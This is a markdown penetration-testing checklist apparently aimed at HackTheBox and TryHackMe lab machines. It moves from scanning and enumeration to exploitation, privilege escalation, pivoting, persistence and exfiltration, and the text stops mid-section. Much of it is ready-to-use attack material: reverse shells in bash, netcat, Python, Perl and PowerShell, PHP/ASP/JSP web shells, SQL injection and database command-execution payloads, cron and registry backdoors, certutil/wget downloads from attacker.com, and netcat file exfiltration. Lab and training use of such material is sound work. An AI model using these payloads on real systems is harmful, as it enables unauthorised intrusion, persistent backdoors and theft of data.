# üéØ Advanced HTB/THM Penetration Testing Checklist

## üöÄ Pre-Engagement Setup

### Environment Preparation
- [ ] **VPN Connection**: Verify HTB/THM VPN connectivity
  ```bash
  ip a | grep tun0  # Check for VPN interface
  ping -c 1 8.8.8.8  # Verify internet connectivity
  ```
- [ ] **Note-Taking Setup**: Initialize workspace (Obsidian, CherryTree, Notion)
- [ ] **Screenshot Tools**: Configure Flameshot/Greenshot with hotkeys
- [ ] **Terminal Setup**: Multiple terminals/tmux sessions ready
- [ ] **Essential Wordlists**: Verify SecLists installation and updates
- [ ] **Proxy Setup**: Configure Burp Suite/OWASP ZAP for web testing
- [ ] **Docker/VM**: Ensure isolated testing environment if needed

### Initial Information Gathering
- [ ] **Target Information**: Record machine details, IP, difficulty, OS hints
- [ ] **Platform Tags/Hints**: Note all provided hints and tags carefully
- [ ] **Research Phase**: Quick Google search for machine name (if not exam)
- [ ] **Time Tracking**: Set up timer for phase management

---

## üîç Phase 1: Advanced Reconnaissance & Enumeration

### Network Discovery (Comprehensive Nmap)

#### Initial Quick Scans
- [ ] **Fast SYN Scan**: 
  ```bash
  nmap -sS -T4 -F <target> -oN nmap_fast.txt
  ```
- [ ] **Default Script Scan**:
  ```bash
  nmap -sC -sV <target> -oN nmap_initial.txt
  ```
- [ ] **Top 1000 Ports**:
  ```bash
  nmap --top-ports 1000 -sV <target> -oN nmap_top1000.txt
  ```

#### Comprehensive Port Scanning
- [ ] **All TCP Ports**:
  ```bash
  nmap -p- --min-rate 10000 <target> -oN nmap_alltcp.txt
  ```
- [ ] **All TCP with Version Detection**:
  ```bash
  nmap -p- -sC -sV --min-rate 5000 <target> -oN nmap_full.txt
  ```
- [ ] **UDP Top Ports**:
  ```bash
  nmap -sU --top-ports 100 <target> -oN nmap_udp.txt
  ```

#### Advanced Nmap Techniques
- [ ] **Aggressive Scan** (if allowed):
  ```bash
  nmap -A -T4 <target> -oN nmap_aggressive.txt
  ```
- [ ] **OS Detection**:
  ```bash
  nmap -O <target> -oN nmap_os.txt
  ```
- [ ] **Firewall Evasion**:
  ```bash
  nmap -f -D RND:10 <target>  # Fragment packets + decoys
  nmap -sF <target>  # FIN scan
  nmap -sX <target>  # Xmas scan
  ```

### Service-Specific Enumeration

#### Web Services (80, 443, 8080, 8443, 3000, 5000, etc.)

##### Manual Reconnaissance
- [ ] **Browse Manually**: Inspect all pages, forms, functionality
- [ ] **Source Code Analysis**: View page source, JavaScript files
- [ ] **Technology Stack Identification**:
  ```bash
  whatweb http://<target>
  curl -I http://<target>  # Check headers
  ```
- [ ] **Robots.txt & Sitemap**:
  ```bash
  curl http://<target>/robots.txt
  curl http://<target>/sitemap.xml
  ```

##### Directory & File Enumeration (Multiple Tools)
- [ ] **Gobuster (Common)**:
  ```bash
  gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html,bak,old,zip -o gobuster_common.txt
  ```
- [ ] **Gobuster (Comprehensive)**:
  ```bash
  gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx,jsp -o gobuster_medium.txt
  ```
- [ ] **FFuF (Faster Alternative)**:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<target>/FUZZ -e .php,.txt,.html,.bak -mc 200,301,302,403 -o ffuf_results.json
  ```
- [ ] **Dirsearch**:
  ```bash
  dirsearch.py -u http://<target> -e php,txt,html,js,bak -x 404,403
  ```
- [ ] **Feroxbuster** (Recursive):
  ```bash
  feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -r
  ```

##### Subdomain Enumeration
- [ ] **FFuF Subdomain Brute-force**:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>" -u http://<target> -fs <size>
  ```
- [ ] **Gobuster DNS**:
  ```bash
  gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```
- [ ] **Amass** (if available):
  ```bash
  amass enum -d <domain>
  ```

##### Advanced Web Enumeration
- [ ] **Parameter Discovery**:
  ```bash
  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>/page?FUZZ=test -mc 200
  ```
- [ ] **Virtual Host Discovery**:
  ```bash
  gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```
- [ ] **API Endpoint Discovery**:
  ```bash
  gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
  ```

#### SMB/NetBIOS (139, 445)

##### Basic Enumeration
- [ ] **SMB Protocol Negotiation**:
  ```bash
  nmap --script smb-protocols <target>
  ```
- [ ] **Share Enumeration**:
  ```bash
  smbclient -L //<target> -N
  smbclient -L //<target> -U guest%
  ```
- [ ] **Comprehensive SMB Enum**:
  ```bash
  enum4linux -a <target>
  enum4linux-ng -A <target>
  ```

##### Advanced SMB Techniques
- [ ] **SMB Vulnerability Scanning**:
  ```bash
  nmap --script smb-vuln* <target>
  ```
- [ ] **SMB Share Access**:
  ```bash
  smbclient //<target>/<share> -N
  smbmap -H <target>
  smbmap -H <target> -u null -p null
  ```
- [ ] **RPC Enumeration**:
  ```bash
  rpcclient -U "" -N <target>
  # Commands: enumdomusers, enumdomgroups, queryuser <rid>
  ```

#### SSH (22)

##### Basic Enumeration
- [ ] **Banner Grabbing**:
  ```bash
  nc <target> 22
  ssh-keyscan <target>
  ```
- [ ] **SSH Audit**:
  ```bash
  ssh-audit <target>
  ```

##### Advanced SSH Testing
- [ ] **Username Enumeration** (CVE-2018-15473):
  ```bash
  python3 ssh_user_enum.py --port 22 --userList users.txt <target>
  ```
- [ ] **Key-based Authentication Testing**:
  ```bash
  ssh -i <private_key> user@<target>
  ```
- [ ] **SSH Tunneling Opportunities**: Note for later lateral movement

#### FTP (21)

##### Basic FTP Testing
- [ ] **Anonymous Login**:
  ```bash
  ftp <target>
  # anonymous:anonymous or anonymous:email@domain.com
  ```
- [ ] **FTP Banner & Version**:
  ```bash
  nc <target> 21
  nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target>
  ```

##### Advanced FTP Enumeration
- [ ] **FTP Brute Force** (if needed):
  ```bash
  hydra -L users.txt -P passwords.txt ftp://<target>
  ```
- [ ] **TFTP Testing** (UDP 69):
  ```bash
  tftp <target>
  # Try: get /etc/passwd
  ```

#### DNS (53)

##### Basic DNS Enumeration
- [ ] **Zone Transfer Attempts**:
  ```bash
  dig axfr @<target> <domain>
  dnsrecon -d <domain> -t axfr
  ```
- [ ] **DNS Brute-forcing**:
  ```bash
  dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
  ```

##### Advanced DNS Testing
- [ ] **DNS Cache Snooping**:
  ```bash
  nmap --script dns-cache-snoop <target>
  ```
- [ ] **DNS Recursion Testing**:
  ```bash
  nmap --script dns-recursion <target>
  ```

#### SNMP (161/UDP)

##### Basic SNMP Enumeration
- [ ] **Community String Testing**:
  ```bash
  snmpwalk -v2c -c public <target>
  snmpwalk -v2c -c private <target>
  ```
- [ ] **SNMP Brute-force**:
  ```bash
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>
  ```

##### Advanced SNMP Enumeration
- [ ] **System Information**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0  # System description
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.1.6.0  # Running processes
  ```
- [ ] **User Enumeration**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25  # Windows users
  ```

#### Additional Services

##### Database Services
- [ ] **MySQL (3306)**:
  ```bash
  nmap --script mysql-info,mysql-audit,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <target>
  ```
- [ ] **PostgreSQL (5432)**:
  ```bash
  nmap --script pgsql-brute <target>
  ```
- [ ] **MSSQL (1433)**:
  ```bash
  nmap --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=password <target>
  ```

##### Mail Services
- [ ] **SMTP (25, 587)**:
  ```bash
  smtp-user-enum -M VRFY -U users.txt -t <target>
  nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 <target>
  ```
- [ ] **POP3 (110)**:
  ```bash
  nmap --script pop3-capabilities,pop3-ntlm-info <target>
  ```
- [ ] **IMAP (143)**:
  ```bash
  nmap --script imap-capabilities,imap-ntlm-info <target>
  ```

##### RDP (3389)
- [ ] **RDP Information**:
  ```bash
  nmap --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 <target>
  ```
- [ ] **RDP Screenshots** (if tools available):
  ```bash
  rdesktop <target>
  ```

##### LDAP (389, 636)
- [ ] **LDAP Enumeration**:
  ```bash
  nmap --script ldap-rootdse,ldap-search <target>
  ldapsearch -x -h <target> -s base namingcontexts
  ```

---

## üé≠ Phase 2: Advanced Vulnerability Assessment

### Automated Vulnerability Scanning

#### Nmap Vulnerability Scripts
- [ ] **Targeted Vulnerability Scans**:
  ```bash
  nmap --script vuln -p <specific_ports> <target>
  nmap --script "*vuln*" --script-args=unsafe=1 <target>
  ```
- [ ] **SMB Vulnerabilities**:
  ```bash
  nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 <target>
  ```

#### Multi-Scanner Approach
- [ ] **Nessus** (if available): Comprehensive vulnerability assessment
- [ ] **OpenVAS** (if available): Open-source vulnerability scanner
- [ ] **Nuclei**:
  ```bash
  nuclei -u http://<target> -t /path/to/nuclei-templates/
  ```

### Web Application Testing (Comprehensive)

#### Authentication Testing
- [ ] **Default Credentials Testing**:
  - admin:admin, admin:password, root:root, admin:, root:toor
  - Service-specific defaults (tomcat:tomcat, admin:admin123)
- [ ] **Password Policy Analysis**: Check for weak password requirements
- [ ] **Account Lockout Testing**: Verify if accounts lock after failed attempts
- [ ] **Session Management**: Check for session fixation, weak session IDs

#### Input Validation Testing

##### SQL Injection (Multiple Techniques)
- [ ] **Manual Testing**:
  ```sql
  ' OR '1'='1
  ' OR '1'='1'--
  ' OR '1'='1'/*
  '; DROP TABLE users--
  ' UNION SELECT 1,2,3--
  ```
- [ ] **SQLMap Automation**:
  ```bash
  sqlmap -u "http://<target>/page.php?id=1" --batch --dbs
  sqlmap -u "http://<target>/page.php?id=1" --batch --tables -D <database>
  sqlmap -u "http://<target>/page.php?id=1" --batch --dump -T <table>
  sqlmap -u "http://<target>/page.php?id=1" --os-shell
  ```
- [ ] **Blind SQL Injection**:
  ```sql
  ' AND (SELECT COUNT(*) FROM users) > 0--
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
  ```

##### Command Injection
- [ ] **Basic Payloads**:
  ```bash
  ; ls
  && whoami
  | id
  `whoami`
  $(whoami)
  ```
- [ ] **Advanced Payloads**:
  ```bash
  ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

##### Cross-Site Scripting (XSS)
- [ ] **Reflected XSS**:
  ```html
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  ```
- [ ] **Stored XSS**: Test in all input fields that display user content
- [ ] **DOM XSS**: Analyze JavaScript for client-side vulnerabilities

##### Directory Traversal & LFI/RFI
- [ ] **Path Traversal**:
  ```
  ../../etc/passwd
  ../../windows/system32/drivers/etc/hosts
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  ```
- [ ] **Local File Inclusion**:
  ```
  php://filter/read=convert.base64-encode/resource=index.php
  expect://whoami
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b
  ```
- [ ] **Remote File Inclusion**:
  ```
  http://attacker.com/shell.txt
  ftp://attacker.com/shell.php
  ```

#### File Upload Vulnerabilities
- [ ] **Unrestricted File Upload**:
  ```php
  <?php system($_GET['cmd']); ?>
  <?php echo shell_exec($_GET['cmd']); ?>
  ```
- [ ] **Bypass Techniques**:
  - Double extension: shell.php.jpg
  - Null byte: shell.php%00.jpg
  - Content-Type manipulation
  - Magic bytes prepending
  - Case variation: .PHP, .pHp

#### Business Logic Testing
- [ ] **IDOR (Insecure Direct Object References)**:
  - Change user IDs in URLs/parameters
  - Test sequential access to resources
- [ ] **Price Manipulation**: In e-commerce applications
- [ ] **Race Conditions**: Concurrent request testing
- [ ] **Workflow Bypasses**: Skip steps in multi-step processes

### CMS-Specific Testing

#### WordPress
- [ ] **WPScan**:
  ```bash
  wpscan --url http://<target> --enumerate u,p,t --api-token <token>
  wpscan --url http://<target> --passwords passwords.txt --usernames admin
  ```
- [ ] **Manual WordPress Testing**:
  - Check /wp-admin/, /wp-content/, /wp-includes/
  - XML-RPC testing: /xmlrpc.php
  - User enumeration: /?author=1

#### Joomla
- [ ] **JoomScan**:
  ```bash
  joomscan -u http://<target>
  ```
- [ ] **Manual Joomla Testing**:
  - /administrator/ access
  - Component/module enumeration

#### Drupal
- [ ] **Droopescan**:
  ```bash
  droopescan scan drupal -u http://<target>
  ```

---

## üí• Phase 3: Advanced Exploitation

### Exploit Research & Development

#### Comprehensive Exploit Research
- [ ] **SearchSploit**:
  ```bash
  searchsploit <service> <version>
  searchsploit -m <exploit_id>  # Copy exploit locally
  ```
- [ ] **Exploit Database**: Browse exploit-db.com
- [ ] **CVE Details**: Check CVE databases for version-specific vulnerabilities
- [ ] **GitHub**: Search for PoC exploits and tools

#### Metasploit Framework
- [ ] **Module Search**:
  ```bash
  msfconsole
  search <service>
  use <module_path>
  show options
  set RHOSTS <target>
  set LHOST <your_ip>
  exploit
  ```
- [ ] **Auxiliary Modules**: Use for additional enumeration
- [ ] **Post-Exploitation Modules**: For privilege escalation and persistence

### Shell Acquisition Techniques

#### Reverse Shell Variations

##### Linux Reverse Shells
- [ ] **Bash**:
  ```bash
  bash -i >& /dev/tcp/IP/PORT 0>&1
  0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196
  ```
- [ ] **Netcat**:
  ```bash
  nc -e /bin/bash IP PORT
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
  ```
- [ ] **Python**:
  ```python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- [ ] **Perl**:
  ```perl
  perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

##### Windows Reverse Shells
- [ ] **PowerShell**:
  ```powershell
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

#### Web Shell Techniques
- [ ] **PHP Web Shells**:
  ```php
  <?php system($_GET['cmd']); ?>
  <?php echo shell_exec($_REQUEST['cmd']); ?>
  <?php eval($_POST['cmd']); ?>
  ```
- [ ] **ASP Web Shells**:
  ```asp
  <%eval request("cmd")%>
  ```
- [ ] **JSP Web Shells**:
  ```jsp
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
  ```

### Advanced Exploitation Techniques

#### SQL Injection to Shell
- [ ] **File Write via SQLi**:
  ```sql
  UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"
  ```
- [ ] **UDF Exploitation**: User-defined function exploitation in MySQL

#### Deserialization Attacks
- [ ] **PHP Object Injection**: Look for unserialize() usage
- [ ] **Java Deserialization**: Test for serialized objects in requests
- [ ] **Python Pickle**: Dangerous pickle.loads() usage

#### Template Injection
- [ ] **Server-Side Template Injection (SSTI)**:
  ```
  {{7*7}}  # Jinja2/Twig
  ${7*7}   # Freemarker
  #{7*7}   # Velocity
  ```

---

## üîì Phase 4: Advanced Post-Exploitation

### Shell Stabilization & Improvement

#### Linux Shell Upgrades
- [ ] **Python PTY**:
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  python -c 'import pty;pty.spawn("/bin/bash")'
  ```
- [ ] **Full TTY**:
  ```bash
  # In reverse shell:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # Ctrl+Z to background
  stty raw -echo; fg
  # Press Enter twice
  export TERM=xterm-256color
  stty rows 24 columns 80
  ```

#### Windows Shell Improvements
- [ ] **PowerShell Upgrade**:
  ```cmd
  powershell
  ```
- [ ] **WinRM/PSRemoting**: If available and credentials obtained

### System Reconnaissance (Comprehensive)

#### Linux System Information
- [ ] **Basic System Info**:
  ```bash
  whoami && id
  uname -a
  cat /etc/os-release
  cat /proc/version
  ```
- [ ] **User & Group Enumeration**:
  ```bash
  cat /etc/passwd
  cat /etc/group
  w
  who
  last
  ```
- [ ] **Network Configuration**:
  ```bash
  ip a
  netstat -antup
  ss -tulpn
  arp -a
  cat /etc/hosts
  ```
- [ ] **Environment Variables**:
  ```bash
  env
  echo $PATH
  ```

#### Windows System Information
- [ ] **Basic System Info**:
  ```cmd
  whoami /all
  systeminfo
  hostname
  ```
- [ ] **User & Group Enumeration**:
  ```cmd
  net users
  net localgroup administrators
  query user
  ```
- [ ] **Network Configuration**:
  ```cmd
  ipconfig /all
  netstat -ano
  arp -a
  ```

---

## ‚¨ÜÔ∏è Phase 5: Advanced Privilege Escalation

### Linux Privilege Escalation (Comprehensive)

#### Automated Enumeration Scripts
- [ ] **LinPEAS**:
  ```bash
  wget http://attacker-ip/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh | tee linpeas_output.txt
  ```
- [ ] **LinEnum**:
  ```bash
  wget http://attacker-ip/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh -t
  ```
- [ ] **Linux Smart Enumeration**:
  ```bash
  wget http://attacker-ip/lse.sh
  chmod +x lse.sh
  ./lse.sh -l2
  ```

#### Manual Privilege Escalation Checks

##### SUID/SGID Binaries
- [ ] **Find SUID Files**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] **Find SGID Files**:
  ```bash
  find / -perm -g=s -type f 2>/dev/null
  find / -perm -2000 -type f 2>/dev/null
  ```
- [ ] **GTFOBins Check**: Cross-reference found binaries with GTFOBins

##### Sudo Privileges
- [ ] **Check Sudo Rights**:
  ```bash
  sudo -l
  ```
- [ ] **Sudo Version Check**:
  ```bash
  sudo --version  # Check for CVE-2021-4034 (PwnKit) and others
  ```

##### Capabilities
- [ ] **Check File Capabilities**:
  ```bash
  getcap -r / 2>/dev/null
  ```

##### Cron Jobs
- [ ] **System Cron Jobs**:
  ```bash
  cat /etc/crontab
  ls -la /etc/cron.*
  crontab -l
  ```
- [ ] **Process Monitoring**:
  ```bash
  # Run pspy or monitor /proc/*/cmdline
  watch -n 1 'ps aux --forest'
  ```

##### Writable Files & Directories
- [ ] **World-Writable Files**:
  ```bash
  find / -writable -type f 2>/dev/null | grep -v proc
  ```
- [ ] **Configuration Files**:
  ```bash
  find /etc -writable -type f 2>/dev/null
  ```

##### Kernel Exploits
- [ ] **Kernel Version Check**:
  ```bash
  uname -r
  cat /proc/version
  ```
- [ ] **Search for Kernel Exploits**:
  ```bash
  searchsploit linux kernel <version>
  ```

##### Network & Services
- [ ] **Internal Services**:
  ```bash
  netstat -ano | grep LISTEN
  ss -tlnp
  ```
- [ ] **Docker Breakout** (if in container):
  ```bash
  ls -la /.dockerenv
  cat /proc/1/cgroup
  ```

### Windows Privilege Escalation (Comprehensive)

#### Automated Enumeration Scripts
- [ ] **WinPEAS**:
  ```cmd
  winPEAS.exe
  winPEAS.bat
  ```
- [ ] **PowerUp** (PowerShell):
  ```powershell
  Import-Module PowerUp.ps1
  Invoke-AllChecks
  ```
- [ ] **Sherlock** (PowerShell):
  ```powershell
  Import-Module Sherlock.ps1
  Find-AllVulns
  ```

#### Manual Windows Privilege Escalation

##### System Information
- [ ] **Patch Level**:
  ```cmd
  systeminfo
  wmic qfe list
  ```

##### User & Group Information
- [ ] **Current User Privileges**:
  ```cmd
  whoami /priv
  whoami /groups
  ```

##### Service Misconfigurations
- [ ] **Unquoted Service Paths**:
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
  ```
- [ ] **Service Permissions**:
  ```cmd
  accesschk.exe -uwcqv "Authenticated Users" *
  ```

##### Registry Privilege Escalation
- [ ] **AlwaysInstallElevated**:
  ```cmd
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```

##### Stored Credentials
- [ ] **Credential Manager**:
  ```cmd
  cmdkey /list
  ```
- [ ] **Unattend Files**:
  ```cmd
  dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
  ```

##### DLL Hijacking
- [ ] **Check for Missing DLLs**:
  ```cmd
  # Use Process Monitor or PowerUp
  ```

### Database Privilege Escalation

#### MySQL
- [ ] **User-Defined Functions**:
  ```sql
  SELECT * FROM mysql.func;
  CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('id');
  ```
- [ ] **File Operations**:
  ```sql
  SELECT LOAD_FILE('/etc/passwd');
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
  ```

#### PostgreSQL
- [ ] **Command Execution**:
  ```sql
  CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
  SELECT system('id');
  ```

#### MSSQL
- [ ] **xp_cmdshell**:
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```

---

## üîÑ Phase 6: Advanced Lateral Movement & Persistence

### Network Pivoting

#### SSH Tunneling
- [ ] **Local Port Forwarding**:
  ```bash
  ssh -L <local_port>:<target_host>:<target_port> user@<pivot_host>
  ```
- [ ] **Dynamic Port Forwarding (SOCKS)**:
  ```bash
  ssh -D 8080 user@<pivot_host>
  # Configure proxychains: socks4 127.0.0.1 8080
  ```
- [ ] **Remote Port Forwarding**:
  ```bash
  ssh -R <remote_port>:<local_host>:<local_port> user@<pivot_host>
  ```

#### Metasploit Pivoting
- [ ] **Meterpreter Autoroute**:
  ```bash
  run autoroute -s <subnet>
  run autoroute -p  # Print routes
  ```
- [ ] **Port Forwarding**:
  ```bash
  portfwd add -l <local_port> -p <remote_port> -r <remote_host>
  ```

#### Chisel Tunneling
- [ ] **Chisel Server** (on attacker machine):
  ```bash
  ./chisel server -p 8080 --reverse
  ```
- [ ] **Chisel Client** (on compromised machine):
  ```bash
  ./chisel client <attacker_ip>:8080 R:socks
  ```

### Windows Lateral Movement

#### Pass-the-Hash Attacks
- [ ] **Using Impacket**:
  ```bash
  python3 psexec.py -hashes <lm_hash>:<nt_hash> administrator@<target>
  python3 wmiexec.py -hashes <lm_hash>:<nt_hash> administrator@<target>
  ```

#### Active Directory Enumeration
- [ ] **BloodHound Data Collection**:
  ```powershell
  Import-Module SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All
  ```
- [ ] **PowerView Enumeration**:
  ```powershell
  Import-Module PowerView.ps1
  Get-NetDomain
  Get-NetUser
  Get-NetGroup
  Get-NetComputer
  ```

#### WinRM Exploitation
- [ ] **Evil-WinRM**:
  ```bash
  evil-winrm -i <target> -u <username> -p <password>
  evil-winrm -i <target> -u <username> -H <hash>
  ```

### Persistence Mechanisms

#### Linux Persistence
- [ ] **SSH Keys**:
  ```bash
  mkdir -p ~/.ssh
  echo "<public_key>" >> ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys
  ```
- [ ] **Cron Jobs**:
  ```bash
  (crontab -l ; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'") | crontab -
  ```
- [ ] **Service Creation**:
  ```bash
  # Create systemd service for persistence
  ```

#### Windows Persistence
- [ ] **Registry Run Keys**:
  ```cmd
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
  ```
- [ ] **Scheduled Tasks**:
  ```cmd
  schtasks /create /tn "backdoor" /tr "C:\path\to\backdoor.exe" /sc minute /mo 1
  ```

---

## üèÜ Phase 7: Advanced Objective Achievement

### Flag Hunting Strategies

#### Common Flag Locations
- [ ] **Linux Standard Locations**:
  ```bash
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  find / -name "*flag*" 2>/dev/null
  find / -name "flag.txt" 2>/dev/null
  ```
- [ ] **Windows Standard Locations**:
  ```cmd
  dir /s /b C:\*user.txt*
  dir /s /b C:\*root.txt*
  dir /s /b C:\*flag*
  ```

#### Advanced Flag Hunting
- [ ] **Hidden Files**:
  ```bash
  find / -name ".*flag*" 2>/dev/null
  ls -la / | grep flag
  ```
- [ ] **Database Searches**:
  ```sql
  SELECT * FROM information_schema.tables WHERE table_name LIKE '%flag%';
  ```
- [ ] **Memory/Process Searching**:
  ```bash
  strings /proc/*/environ | grep -i flag
  ```
- [ ] **Web Directory Flags**:
  ```bash
  find /var/www -name "*flag*" 2>/dev/null
  find /opt -name "*flag*" 2>/dev/null
  ```

### Data Exfiltration

#### File Transfer Methods
- [ ] **HTTP Server** (Python):
  ```bash
  # On attacker machine:
  python3 -m http.server 80
  
  # On target:
  wget http://<attacker_ip>/file
  curl http://<attacker_ip>/file -o file
  ```
- [ ] **Netcat File Transfer**:
  ```bash
  # Receiving (attacker):
  nc -nvlp 4444 > received_file
  
  # Sending (target):
  nc <attacker_ip> 4444 < file_to_send
  ```
- [ ] **Base64 Encoding**:
  ```bash
  base64 file.txt
  # Copy output and decode on attacker machine
  echo "<base64_string>" | base64 -d > file.txt
  ```

---

## üõ†Ô∏è Advanced Toolset & Techniques

### Essential Tools (Expanded)

#### Reconnaissance Tools
- **Nmap**: Network discovery and security auditing
- **Masscan**: High-speed port scanner
- **Amass**: Attack surface mapping
- **Subfinder**: Subdomain discovery
- **Httpx**: HTTP toolkit
- **Nuclei**: Vulnerability scanner

#### Web Application Testing
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Web application security scanner
- **Gobuster**: Directory/file brute-forcer
- **FFuF**: Fast web fuzzer
- **SQLMap**: SQL injection exploitation
- **Nikto**: Web server scanner

#### Exploitation Frameworks
- **Metasploit**: Penetration testing framework
- **Cobalt Strike**: Advanced threat emulation
- **Empire**: PowerShell post-exploitation agent
- **Covenant**: .NET command and control framework

#### Post-Exploitation Tools
- **LinPEAS/WinPEAS**: Privilege escalation scripts
- **BloodHound**: Active Directory attack path analysis
- **Mimikatz**: Windows credential extraction
- **PowerView**: PowerShell AD enumeration
- **Impacket**: Python network protocols toolkit

### Advanced Techniques

#### Evasion Techniques
- [ ] **Firewall Evasion**:
  ```bash
  nmap -f <target>  # Fragment packets
  nmap -D RND:10 <target>  # Decoy scan
  nmap --source-port 53 <target>  # Source port manipulation
  ```
- [ ] **IDS/IPS Evasion**:
  ```bash
  nmap -T1 <target>  # Slow scan
  nmap --scan-delay 1s <target>  # Introduce delays
  ```

#### Living Off The Land
- [ ] **Windows LOLBAS**:
  ```cmd
  certutil -urlcache -split -f http://attacker.com/file.exe file.exe
  bitsadmin /transfer job http://attacker.com/file.exe C:\temp\file.exe
  ```
- [ ] **Linux LOLBINS**:
  ```bash
  wget http://attacker.com/file -O /tmp/file
  curl http://attacker.com/file -o /tmp/file
  ```

#### Steganography & Obfuscation
- [ ] **Steganography Tools**:
  - Steghide
  - Stegsolve
  - Binwalk
- [ ] **Code Obfuscation**:
  - PowerShell obfuscation
  - Python obfuscation
  - JavaScript obfuscation

---

## üö® Advanced Troubleshooting & Tips

### Common Issues & Solutions

#### Shell Issues
- [ ] **Shell Dies Quickly**:
  - Check for shell timeout settings
  - Use shell stabilization techniques
  - Consider using encrypted shells (HTTPS reverse shells)

- [ ] **Special Characters Not Working**:
  - URL encode payloads
  - Try different encoding methods
  - Use alternative payload formats

#### Network Issues
- [ ] **Firewall Blocking**:
  - Try different ports (80, 443, 53, 1337)
  - Use HTTP/HTTPS tunneling
  - Fragment packets or use decoys

- [ ] **NAT/Routing Issues**:
  - Verify VPN connectivity
